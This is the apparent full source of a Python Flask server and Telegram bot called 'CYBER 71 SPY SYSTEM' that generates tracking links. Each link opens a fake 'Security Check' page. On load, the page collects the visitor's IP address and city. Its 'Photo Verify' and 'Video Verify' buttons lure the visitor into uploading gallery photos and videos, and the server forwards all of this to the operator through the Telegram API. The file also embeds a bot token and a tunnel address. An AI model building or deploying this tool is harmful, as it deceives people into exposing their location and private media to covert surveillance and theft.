import base64
import threading
import requests
import os
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = '8757294593:AAEzF8MXSiLVG1vgazLrcIVWcPbjdYJYPZA'
BASE_URL = 'https://populations-pleased-laundry-does.trycloudflare.com' 
PORT = 5000

app = Flask(__name__)

@app.route('/track/<chat_id>')
def track(chat_id):
    html = """
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Check</title></head>
    <body style="background-color:black; color:white; text-align:center; padding-top:50px;">
        <h2>Verifying...</h2>
        <input type="file" id="i" accept="image/*" style="display:none;" onchange="u(this,'/up')">
        <input type="file" id="v" accept="video/*" style="display:none;" onchange="u(this,'/uv')">
        <button onclick="document.getElementById('i').click()" style="padding:10px; background:red; color:white;">Photo Verify</button>
        <button onclick="document.getElementById('v').click()" style="padding:10px; background:blue; color:white;">Video Verify</button>
        <script>
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
                fetch('/ui',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'{{chat_id}}',info:d})});
            });
            function u(i,p){
                let r=new FileReader(); r.onload=()=>fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({img:r.result,id:'{{chat_id}}'})}); r.readAsDataURL(i.files[0]);
            }
        </script>
    </body></html>
    """
    return render_template_string(html, chat_id=chat_id)

@app.route('/ui', methods=['POST'])
def ui():
    d = request.json; i = d['info']
    msg = f"🌐 **IP DETECTED!**\\n📍 IP: `{i.get('ip')}`\\n🏙️ City: {i.get('city')}\\n🛡️ System: ENAFUL"
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', params={'chat_id': d['id'], 'text': msg, 'parse_mode': 'Markdown'})
    return "OK"

@app.route('/up', methods=['POST'])
def up():
    d = request.json; b = base64.b64decode(d['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', params={'chat_id': d['id'], 'caption': '📸 Gallery Photo Captured!'}, files={'photo': ('s.png', b)})
    return "OK"

@app.route('/uv', methods=['POST'])
def uv():
    d = request.json; b = base64.b64decode(d['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendVideo', params={'chat_id': d['id'], 'caption': '🎥 Gallery Video Recorded!'}, files={'video': ('c.mp4', b)})
    return "OK"

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("🚀 Generate Spy Link", callback_data='gen')]]
    await u.message.reply_text("🛡️ **CYBER 71 SPY SYSTEM**\\nOwner: ENAFUL", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def cb(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer()
    if q.data == 'gen':
        await q.edit_message_text(f"✅ Link: `{BASE_URL}/track/{q.from_user.id}`", parse_mode='Markdown')

if __name__ == '__main__':
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT)).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(cb))
    bot.run_polling(drop_pending_updates=True) 

